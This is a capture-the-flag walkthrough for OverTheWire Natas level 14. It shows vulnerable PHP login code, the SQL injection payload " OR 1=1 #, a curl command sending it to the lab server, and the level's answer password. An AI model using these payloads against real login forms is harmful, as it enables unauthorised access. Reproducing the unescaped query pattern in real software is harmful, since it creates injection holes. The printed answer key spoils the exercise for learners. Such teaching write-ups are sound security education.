# Natas Level 14 → 15

## Goal

A login form queries a MySQL database with user input pasted straight into the SQL string. Classic **SQL injection** — the `" OR 1=1 #` payload bypasses the login by making the WHERE clause always true.

## Concepts you'll learn

- **SQL injection** at its simplest: user input is concatenated into the query, quotes aren't escaped, and you can rewrite the query's logic
- The canonical payload: `" OR "1"="1" --` (or `#` for MySQL) — always-true, comment out the rest
- Why parameterised queries (`?` placeholders) exist

## Walkthrough

### 1. View the source

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
    echo "Successful login! The password for natas15 is <censored>";
} else {
    echo "Access denied!";
}
```

Double-quoted concatenation with no escaping. Type an input with a `"` and you can break out of the string.

### 2. Craft the injection

Submit:

- `username`: `" OR 1=1 #`
- `password`: (anything)

The resulting query becomes:

```sql
SELECT * from users where username="" OR 1=1 #" and password="..."
```

`#` starts a MySQL comment, killing the rest of the query. `OR 1=1` makes the WHERE clause always true. At least one row is returned; the app declares "successful login" and prints the password.

### 3. (Alternative) Curl

```bash
$ curl -u natas14:<pass> \
       --data-urlencode 'username=" OR 1=1 #' \
       --data-urlencode 'password=x' \
       http://natas14.natas.labs.overthewire.org/index.php | grep password
```

Expected:

```
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

## The answer

The password for `natas15` is:

**`AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas14.natas.labs.overthewire.org/>
